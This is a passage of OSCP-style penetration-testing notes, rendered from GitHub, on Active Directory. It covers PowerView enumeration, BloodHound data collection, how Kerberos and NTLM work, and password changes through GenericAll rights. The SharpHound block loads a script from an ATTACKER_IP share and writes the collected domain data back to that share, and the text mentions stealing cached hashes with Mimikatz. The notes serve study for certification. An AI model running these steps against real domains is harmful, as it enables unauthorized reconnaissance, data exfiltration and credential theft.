class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all computers\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainComputer\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select dnshostname\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eoperatingsystem\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eoperatingsystemversion\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get all IP addresses and hostnames\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eresolve-ipaddress\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eGet-DomainComputer\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.dnshostname\u003c/span\u003e\u003c/span\u003e})\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get IP of specific computer\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eResolve-IPAddress\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName NAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e finds machines on the local domain where the current user has local administrator access\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-LocalAdminAccess\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e finds reachable shares on domain machines\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-DomainShare\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-DomainShare\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCheckShareAccess\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003efl \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e only list those we can access\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e finds domain machines where specific users are logged into\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-DomainUserLocation\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerates the members of specified local group on machines in the domain\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-DomainLocalGroupMember\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e finds domain machines where specific processes are currently running\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-DomainProcess\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e returns users logged on the local (or a remote) machine\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetLoggedon\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerates members of a specific local group on the local (or remote) machine\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetLocalGroupMember\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e returns open shares on the local (or a remote) machine\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetShare\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e returns session information for the local (or a remote) machine\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e queries registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\SrvsvcSessionInfo\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e which is locked down to Admins starting with Win10-1709 and Server2019-1809, so won't work\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetSession\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName NAME \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eVerbose\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if Get-NetSession doesn't work, try PsLoggedon.exe from Sysinternals\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (requires Remote Registry service to be enabled):\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003ePsLoggedon.exe\u003c/span\u003e \\\\HOSTNAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all sites in domain\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainSite\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select cn\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all subnets\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainSubnet\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.1.3 Domain Enumeration with BloodHound\u003c/h3\u003e\u003ca id=\"user-content-513-domain-enumeration-with-bloodhound\" class=\"anchor\" aria-label=\"Permalink: 5.1.3 Domain Enumeration with BloodHound\" href=\"#513-domain-enumeration-with-bloodhound\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBloodHound lets you perform graph-analysis on Active Directory to map out the domain and find attack paths. Its companion, SharpHound, performs the preliminary data collection on a Windows domain host.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOn the victim machine:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# stop complaints about running downloaded scripts\npowershell -ep bypass\n\n# connect to attacker SMB share\nnet use \\\\ATTACKER_IP herpderp /user:derp\n\n# load all the functions from SharpHound into your session\nImport-Module \\\\ATTACKER_IP\\share\\SharpHound.ps1\n\n# collect all the data (except local group policies)\nInvoke-BloodHound -CollectionMethod All -OutputDirectory \\\\ATTACKER_IP\\share -ZipFileName \u0026quot;derphound.zip\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e stop complaints about running downloaded scripts\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect to attacker SMB share\u003c/span\u003e\nnet use \\\\ATTACKER_IP herpderp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:derp\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e load all the functions from SharpHound into your session\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eImport-Module\u003c/span\u003e \\\\ATTACKER_IP\\share\\SharpHound.ps1\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e collect all the data (except local group policies)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-BloodHound\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCollectionMethod All \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOutputDirectory \\\\ATTACKER_IP\\share \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eZipFileName \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederphound.zip\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOn the attacker machine:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# start the neo4j server\nsudo neo4j start\n\n# browse to neo4j webUI to configure a password\nfirefox http://localhost:7474\n# log in with neo4j:neo4j\n# and change password to whatever you want (remember for later!)\n\n# now that neo4j is running, start bloodhound\nbloodhound\n# configure it to log into local neo4j server using approriate URL and creds\n# URL: bolt://localhost:7687\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start the neo4j server\u003c/span\u003e\nsudo neo4j start\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e browse to neo4j webUI to configure a password\u003c/span\u003e\nfirefox http://localhost:7474\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e log in with neo4j:neo4j\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e and change password to whatever you want (remember for later!)\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e now that neo4j is running, start bloodhound\u003c/span\u003e\nbloodhound\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e configure it to log into local neo4j server using approriate URL and creds\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e URL: bolt://localhost:7687\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUpload your zip file by clicking the \"Upload Data\" button from the top-right set of menu buttons (looks like an up arrow in a circle), and wait for database to get updated.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eGo to the Analysis tab under the search bar's hamburger menu.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/camercu/oscp-prep/blob/main/assets/bloodhound-analysis-tab.png\"\u003e\u003cimg src=\"/camercu/oscp-prep/raw/main/assets/bloodhound-analysis-tab.png\" alt=\"\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cem\u003eFind Shortest Paths to Domain Admins\u003c/em\u003e query is a very handy one:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/camercu/oscp-prep/blob/main/assets/bloodhound-shortest-path-domain-admin.png\"\u003e\u003cimg src=\"/camercu/oscp-prep/raw/main/assets/bloodhound-shortest-path-domain-admin.png\" alt=\"\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eClicking on any node brings up its \"Node Info\" tab under the search bar, which contains lots of details about the node.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eTIP\u003c/strong\u003e: It's a good idea to check the details of users/groups/computers you control. Especially look at the \u003cem\u003eOutbound Object Control\u003c/em\u003e and \u003cem\u003eLocal Admin Rights\u003c/em\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf you right-click an edge (line) between two nodes and click \u003ccode\u003e? Help\u003c/code\u003e, BloodHound will show additional information:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/camercu/oscp-prep/blob/main/assets/bloodhound-link-help.png\"\u003e\u003cimg src=\"/camercu/oscp-prep/raw/main/assets/bloodhound-link-help.png\" alt=\"\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIn the same Help modal, check out the \u003cem\u003eAbuse\u003c/em\u003e tab for tips on how to exploit this link.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cem\u003eShortest Paths to Domain Admins from Owned Principals\u003c/em\u003e query is also amazing. Before you use it, you must right-click on every node that you \"own\" (e.g. user accounts, computers), and mark it as owned.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, you can right-click on any node and click \"Shortest Paths To Here\".\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThere are four \u003cstrong\u003ekeyboard shortcuts\u003c/strong\u003e when the graph rendering area has focus:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ckbd\u003eCtrl\u003c/kbd\u003e: Cycle through the three different node label display settings - default, always show, always hide.\u003c/li\u003e\n\u003cli\u003e\u003ckbd\u003eSpace\u003c/kbd\u003e: Bring up the spotlight window, which lists all nodes that are currently drawn. Click an item in the list and the GUI will zoom into and briefly highlight that node.\u003c/li\u003e\n\u003cli\u003e\u003ckbd\u003eBackspace\u003c/kbd\u003e: Go back to the previous graph result rendering. This is the same functionality as clicking the Back button in the search bar.\u003c/li\u003e\n\u003cli\u003e\u003ckbd\u003es\u003c/kbd\u003e: Toggle the expansion or collapse of the information panel below the search bar. This is the same functionality as clicking the More Info button in the search bar.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eYou can constrain your searches in the search bar with tags for the node-type like \u003ccode\u003euser:WHATEVER\u003c/code\u003e. Allowed tags/node-types are:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eGroup\u003c/li\u003e\n\u003cli\u003eDomain\u003c/li\u003e\n\u003cli\u003eComputer\u003c/li\u003e\n\u003cli\u003eUser\u003c/li\u003e\n\u003cli\u003eOU\u003c/li\u003e\n\u003cli\u003eGPO\u003c/li\u003e\n\u003cli\u003eContainer\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eFrom the search bar, you can also click the \"Pathfinding\" button (looks like a road into the distance) to tell it to search from/to the node you select from the search.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eTIP\u003c/strong\u003e: \u003ca href=\"https://github.com/fox-it/BloodHound.py\"\u003e\u003ccode\u003ebloodhound.py\u003c/code\u003e\u003c/a\u003e (unofficial tool) lets you collect/ingest most of the same active directory information as SharpHound, but you can run it straight from your Kali box. It requires at least a domain user's credentials and the ability to reach/query the appropriate DC.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWhen you're finished with BloodHound, clear the database by going to the search bar's hamburger menu \u0026gt; Database Info tab, scroll to bottom and click \"\u003cstrong\u003eClear Database\u003c/strong\u003e\" button.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2 Attacking Active Directory Authentication\u003c/h2\u003e\u003ca id=\"user-content-52-attacking-active-directory-authentication\" class=\"anchor\" aria-label=\"Permalink: 5.2 Attacking Active Directory Authentication\" href=\"#52-attacking-active-directory-authentication\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eKerberos is the \"preferred\" (default and most secure) authentication method in Active Directory. Other methods include LM (LAN Manager), NTLM (New Technology LAN Manager), and NTLMv2. LM and NTLM are legacy protocols disabled by default in modern systems, but they are provided for backwards compatibility. For the rest of this section, I'll refer to NTLMv2 as NTLM.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMicrosoft \u003cstrong\u003eKerberos\u003c/strong\u003e (based on MIT's Kerberos version 5) has been used as the default authentication mechanism since Windows Server 2003. It is a stateless ticket-based authentication system, where clients get \"tickets\" (cryptographically secured data containing access permissions) from the \u003cem\u003eKey Distribution Center (KDC)\u003c/em\u003e. Application servers verify the client's ticket before granting access to AD objects. The Domain Controller performs the role of KDC in Active Directory. The KDC consists of two services, the \u003cem\u003eAuthentication Server (AS)\u003c/em\u003e and the \u003cem\u003eTicket Granting Service (TGS)\u003c/em\u003e. Each is used in a separate stage of the Kerberos authentication process.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThere are three stages/phases Kerberos authentication:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eClient obtains a \u003cem\u003eTicket Granting Ticket (TGT)\u003c/em\u003e from the KDC's AS. This happens at initial logon and when the TGT is about to expire.\u003c/li\u003e\n\u003cli\u003eClient uses its TGT to request a \u003cem\u003eservice ticket\u003c/em\u003e (permission to access a specific service) from the KDC's TGS.\u003c/li\u003e\n\u003cli\u003eClient uses the service ticket to access the desired service on an application server.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eThe detailed steps to obtain a TGT from the AS are:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eClient sends \u003cem\u003eAuthentication Server Request (AS-REQ)\u003c/em\u003e to KDC's AS. AS-REQ contains username and an encrypted timestamp (to prevent replay attacks). The timestamp is encrypted with the NT hash (i.e. unsalted MD4 hash) of user's password.\u003c/li\u003e\n\u003cli\u003eKDC's AS decrypts timestamp using user's password hash stored in the \u003cstrong\u003e\u003ccode\u003entds.dit\u003c/code\u003e\u003c/strong\u003e file. If decrypted timestamp matches current time (and isn't duplicate), the KDC sends an \u003cem\u003eAuthentication Server Reply (AS-REP)\u003c/em\u003e to the client. AS-REP contains a \u003cem\u003esession key\u003c/em\u003e and a \u003cem\u003eTicket Granting Ticket (TGT)\u003c/em\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003esession key has HMAC encrypted with user's NT hash for their use later.\u003c/li\u003e\n\u003cli\u003eTGT contains information about user, domain, IP of client, timestamp, and session key.\u003c/li\u003e\n\u003cli\u003eTo avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the \u003cem\u003e\u003ccode\u003ekrbtgt\u003c/code\u003e\u003c/em\u003e account) known only to the KDC and cannot be decrypted by the client.\u003c/li\u003e\n\u003cli\u003eTGT valid for 10 hours by default, with automatic renewal\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eWhen the client wants to access a service in the domain (e.g. share drive, email), the client must first request a service ticket from the KDC. The steps are:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eClient sends \u003cem\u003eTicket Granting Service Request (TGS-REQ)\u003c/em\u003e to KDC's TGS. TGS-REQ contains the name of requested service/resource (known as the \u003cem\u003eService Principal Name (SPN)\u003c/em\u003e in AD), the TGT (still encrypted with \u003ccode\u003ekrbtgt\u003c/code\u003e's hash), and encrypted username and timestamp (both encrypted with session key).\u003c/li\u003e\n\u003cli\u003eKDC performs multiple actions/checks to verify the TGS-REQ:\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eChecks requested resource exists\u003c/li\u003e\n\u003cli\u003eDecrypts TGT, extracts session key\u003c/li\u003e\n\u003cli\u003eDecrypts username and timestamp with session key\u003c/li\u003e\n\u003cli\u003eChecks valid timestamp (matches current time, not duplicate)\u003c/li\u003e\n\u003cli\u003eChecks username of TGT and TGS-REQ match\u003c/li\u003e\n\u003cli\u003eChecks IP of client matches IP from TGS\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eNOTE: the KDC does NOT check that the user is allowed access to the service. This function is performed by the SPN itself. This opens the door for a Kerberoasting attack.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eAssuming checks pass, KDC sends client \u003cem\u003eTicket Granting Server Reply (TGS-REP)\u003c/em\u003e, containing name of service with access granted, session key for use between client and service, and a \u003cem\u003eservice ticket\u003c/em\u003e containing the username and group memberships along with the newly-created session key.\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eThe service name and service-session key are encrypted with the TGT-session key for client to use.\u003c/li\u003e\n\u003cli\u003eThe service ticket is encrypted using the password hash of the SPN registered for the service in question.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eFinally, the client can request access to the service from the application server:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eClient sends server \u003cem\u003eApplication Request (AP-REQ)\u003c/em\u003e, which includes service ticket and the encrypted username and timestamp (encrypted with the service-session key)\u003c/li\u003e\n\u003cli\u003eApplication server performs several actions/checks to verify the AP-REQ:\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eDecrypts the service ticket using its service account password hash\u003c/li\u003e\n\u003cli\u003eExtracts username and session key from service ticket\u003c/li\u003e\n\u003cli\u003eUses session key to decrypt username and timestamp\u003c/li\u003e\n\u003cli\u003eChecks valid timestamp\u003c/li\u003e\n\u003cli\u003eChecks username of service ticket matches decrypted one from AP-REQ\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eAssuming checks pass, the client is granted access to the service\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNTLM\u003c/strong\u003e (NTLMv2) authentication is a challenge-and-response system. NTLM is a fast hashing algorithm for authentication, so it can easily be cracked. These are the steps for NTLM authentication:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eClient calculates the cryptographic NTLM hash from the user's password\u003c/li\u003e\n\u003cli\u003eClient sends username to (application) server\u003c/li\u003e\n\u003cli\u003eServer sends nonce to client\u003c/li\u003e\n\u003cli\u003eClient encrypts nonce with NTLM hash and sends result to server\u003c/li\u003e\n\u003cli\u003eServer forwards encrypted nonce, nonce and username to DC\u003c/li\u003e\n\u003cli\u003eDC encrypts nonce with stored NTLM hash of user and checks against supplied encrypted nonce\u003c/li\u003e\n\u003cli\u003eIf two encrypted nonces match, DC sends authentication verified message to server\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eNTLM authentication is used in 3 cases in Active Directory:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003ewhen a client authenticates to a server by IP address (instead of by hostname)\u003c/li\u003e\n\u003cli\u003eif the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server\u003c/li\u003e\n\u003cli\u003ethird-party applications may choose to use NTLM authentication instead of Kerberos\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eIn modern versions of Windows, the NTLM hashes/Kerberos tokens are cached in the Local Security Authority Subsystem Service (LSASS) memory space, so we can steal them using Mimikatz. To steal tickets, \u003cstrong\u003emake sure you interact with the target service first\u003c/strong\u003e (e.g. list directory of share)!\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMicrosoft provides the AD role \u003cem\u003eActive Directory Certificate Services (AD CS)\u003c/em\u003e to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources. If a server is installed as a \u003cem\u003eCertification Authority (CA)\u003c/em\u003e it can issue and revoke digital certificates (and much more). This can be abused to defeat active directory authentication that relies on PKI, including Smart Cards.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2.1 Change Active Directory Credentials\u003c/h3\u003e\u003ca id=\"user-content-521-change-active-directory-credentials\" class=\"anchor\" aria-label=\"Permalink: 5.2.1 Change Active Directory Credentials\" href=\"#521-change-active-directory-credentials\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you have \u003ccode\u003eGenericAll\u003c/code\u003e (or \u003ccode\u003eSelf\u003c/code\u003e) permissions over any user in Active Directory, you can change that user's password. This is one way to privesc or move laterally in an Active Directory domain.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo change the password of a user on a Windows AD domain:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# simple way\nnet user /domain USERNAME PASSWORD\n\n# powershell way\nSet-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText \u0026quot;p@ssw0rd\u0026quot; -Force) -NewPassword (ConvertTo-SecureString -AsPlainText \u0026quot;qwert@12345\u0026quot; -Force)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e simple way\u003c/span\u003e\nnet user \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain USERNAME PASSWORD\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e powershell way\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eSet-ADAccountPassword\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eIdentity someuser \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOldPassword (\u003cspan class=\"pl-c1\"\u003eConvertTo-SecureString\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAsPlainText \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ep@ssw0rd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce) \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eNewPassword (\u003cspan class=\"pl-c1\"\u003eConvertTo-SecureString\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAsPlainText \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eqwert@12345\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce)\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2.2 Password Spraying in Active Directory\u003c/h3\u003e\u003ca id=\"user-content-522-password-spraying-in-active-directory\" class=\"anchor\" aria-label=\"Permalink: 5.2.2 Password Spraying in Active Directory\" href=\"#522-password-spraying-in-active-directory\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" 